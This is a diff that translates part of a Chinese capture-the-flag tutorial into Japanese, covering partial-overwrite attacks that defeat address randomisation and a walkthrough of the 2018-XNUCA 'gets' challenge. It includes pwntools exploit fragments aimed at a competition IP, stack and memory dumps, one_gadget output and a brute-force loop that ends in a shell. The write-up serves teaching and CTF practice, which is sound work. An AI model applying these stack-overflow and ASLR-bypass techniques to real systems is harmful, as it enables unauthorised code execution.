+このときの戻りアドレスと get shell 関数のアドレスは、下位の 8 bit しか違わないことが分かります。下位 8 bit を `0x?A3E` に書き換えれば、ある程度の確率で get shell できます。
 
-最终的脚本如下:
+最終的なスクリプトは次のとおりです。
 ```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
@@ -890,11 +892,11 @@ while True:
         io.close()
         print e
 ```
-需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段
+なお、このテクニックはスタック上だけでなく、ヒープ上でもアドレスのランダム化を回避する有効な手段です。
 
 ### 2018-XNUCA-gets
 
-这个题目也挺有意思的，如下
+この問題もなかなか面白いです。次のとおりです。
 
 ```c
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
@@ -906,11 +908,11 @@ __int64 __fastcall main(__int64 a1, char **a2, char **a3)
 }
 ```
 
-程序就这么小，很明显有一个栈溢出的漏洞，然而没有任何 leak。。
+プログラムはこれだけの小ささで、明らかにスタックオーバーフローの脆弱性が1つありますが、leak は一切ありません……。
 
-#### 确定保护
+#### 保護の確認
 
-先来看看程序的保护
+まず、プログラムの保護を見てみます。
 
 ```c
 [*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
@@ -922,11 +924,11 @@ __int64 __fastcall main(__int64 a1, char **a2, char **a3)
 
 ```
 
-比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。
+幸い、プログラムには canary がないため、当然 EIP は簡単に制御できますが、どこに制御するかが問題です。
 
 #### 分析
 
-我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。
+ELF の基本的な実行の流れ(実行ファイルの部分)から、プログラムの基本的な実行の流れが分かります。同時に、スタック上に2つの関数の戻りアドレスがあることが分かります。
 
 ```asm
 pwndbg> stack 25
@@ -950,7 +952,7 @@ pwndbg> stack 25
 12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0
 ```
 
-其中 `__libc_start_main+240` 位于 libc 中，`_dl_init+139` 位于 ld 中
+このうち `__libc_start_main+240` は libc 内に、`_dl_init+139` は ld 内にあります。
 
 ```
 0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
@@ -961,27 +963,27 @@ pwndbg> stack 25
 0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
 ```
 
-一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？
+自然な考えは、partial overwrite でこの2つのアドレスのどちらかを shell を得られる場所に書き換えることで、それは当然 Onegadget です。では、どちらを上書きすればよいのでしょうか。
 
-我们先来分析一下 `libc` 的基地址 `0x7ffff7a0d000`。我们一般要覆盖字节的话，至少要覆盖1个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 `gets`读取的，也就意味着字符串的末尾肯定会存在`\x00`。
+まず `libc` のベースアドレス `0x7ffff7a0d000` を分析します。バイトを上書きする場合、onegadget にジャンプするには少なくとも 1.5 バイトを上書きする必要があります。しかしプログラムは `gets` で読み込むため、文字列の末尾には必ず `\x00` が付きます。
 
-而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看`__libc_start_main+240` 的地址 `0x7ffff7a2d830`，如果覆盖3个字节，那么就是 `0x7ffff700xxxx`，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。
+また、バイトの上書きは整数バイト単位で行う必要があり、少なくとも 3 バイトを上書きすることになります。`__libc_start_main+240` のアドレス `0x7ffff7a2d830` を見ると、3 バイト上書きすれば `0x7ffff700xxxx` となり、すでに libc のベースアドレスより小さくなってしまい、その手前に意図的に実行できるコードの位置もありません。
 
-一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 `__libc_start_main+240` ，显然是不可能的。
+一般に libc_start_main の libc 内でのオフセットはそれほど大きく変わらないので、`__libc_start_main+240` を上書きするのは明らかに不可能です。
 
-而 ld 的基地址呢？如果我们覆盖了栈上`_dl_init+139`，即为`0x7ffff700xxxx`。而观察上述的内存布局，我们可以发现`libc`位于 `ld` 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为`\x00` 的。
+では ld のベースアドレスはどうでしょうか。スタック上の `_dl_init+139` を上書きすると `0x7ffff700xxxx` になります。上のメモリレイアウトを見ると、`libc` は `ld` よりも低位アドレス側にあるので、ランダム化のとき libc の3バイト目が `\x00` になる可能性が非常に高いです。
 
-举个例子，目前两者之间的偏移为
+例を挙げると、現在の両者の間のオフセットは次のとおりです。
 
 ```
 0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
 ```
 
-那么如果 ld 被加载到了 `0x7ffff73ca000`，则显然 `libc` 的起始地址就是`0x7ffff7000000`。
+そこで ld が `0x7ffff73ca000` にロードされたなら、`libc` の開始アドレスは当然 `0x7ffff7000000` です。
 
-因此，我们有足够的理由选择覆盖栈上存储的`_dl_init+139`。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，
+したがって、スタックに格納された `_dl_init+139` を上書きすることを選ぶ十分な理由があります。では何に書き換えるのでしょうか。まだ分かりません。libc のバージョンがまだ分からないからです……
 
-我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。
+まず適当に上書きして、プログラムがクラッシュするかを見てみます。この時点では libc ライブラリのコードが実行される可能性が高いからです。
 
 ```python
 from pwn import *
@@ -1022,7 +1024,7 @@ if __name__ == "__main__":
     exp('106.75.4.189', 35273)
 ```
 
-最后发现报出了如下错误，一方面，我们可以判断出这肯定是 2.23 版本的 libc；另外一方面，我们我们可以通过`(cfree+0x4c)[0x7f57b6f9253c]`来最终定位 libc 的版本。
+最終的に次のようなエラーが出ました。一方では、これが 2.23 バージョンの libc であると判断できます。もう一方では、`(cfree+0x4c)[0x7f57b6f9253c]` から libc のバージョンを最終的に特定できます。
 
 ```
 ======= Backtrace: =========
@@ -1058,7 +1060,7 @@ if __name__ == "__main__":
 ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
 ```
 
-确定好了 libc 的版本后，我们可以选一个 one_gadget，这里我选择第一个，较低地址的。
+libc のバージョンを確定したら、one_gadget を選べます。ここでは最初の、より低いアドレスのものを選びます。
 
 ```shell
 ➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
@@ -1080,7 +1082,7 @@ constraints:
 
 ```
 
-使用如下 exp 继续爆破，
+次の exp でブルートフォースを続けます。
 
 ```python
 from pwn import *
@@ -1123,11 +1125,11 @@ if __name__ == "__main__":
     exp('106.75.4.189', 35273)
 ```
 
-最后获取到 shell。
+最終的に shell を得られました。
 
 ```python
 $ ls
 exp.py  gets
 ```
 
-### 题目
+### 問題
